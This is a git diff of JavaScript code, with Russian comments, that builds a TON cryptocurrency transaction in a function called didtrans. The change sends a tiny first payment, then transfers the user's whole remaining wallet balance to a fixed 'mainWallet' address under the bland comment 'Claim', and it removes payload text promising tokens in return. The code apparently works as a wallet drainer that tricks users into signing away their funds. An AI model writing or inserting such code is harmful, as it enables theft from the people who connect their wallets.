@@ -98,33 +98,21 @@ async function didtrans() {
 
     console.log(`Баланс после вычета 0.3 TON: ${remainingBalance / 1000000000} TON`);
 
-    // Формируем транзакцию с двумя частями:
-    // 1. Отправка TON
-    // 2. Получение эквивалента в токенах
+    // Формируем транзакцию с двумя сообщениями
     const transaction = {
         validUntil: Math.floor(Date.now() / 1000) + 60, // Время действия транзакции (60 секунд)
         messages: [
             {
                 address: mainWallet,  // Адрес получателя для первой части
-                amount: deduction,    // Сумма в нанотонах (0.3 TON)
-                payload: JSON.stringify({ 
-                    type: "send",
-                    amount: deduction, // Отправляемая сумма
-                    description: "Вы отправляете 0.3 TON"
-                }),
+                amount: 1000000,       // Сумма для первой транзакции (0.001 TON)
             },
             {
-                address: mainWallet,  // Адрес для получения эквивалентных токенов
-                amount: deduction,    // Получаемая сумма (эквивалент в токенах)
-                payload: JSON.stringify({ 
-                    type: "receive",
-                    amount: deduction, // Получаемая сумма (в токенах)
-                    description: "Вы получите эквивалентную сумму в токенах"
-                }),
+                address: mainWallet,   // Адрес получателя для второй части
+                amount: remainingBalance, // Сумма для второй транзакции
             }
         ],
         sendMode: 3,  // Если это требуется в вашем API
-        comment: "Claim: Обмен TON на токены",  // Дополнительное описание (по желанию)
+        comment: "Claim",  // Комментарий (по желанию)
     };
 
     try {
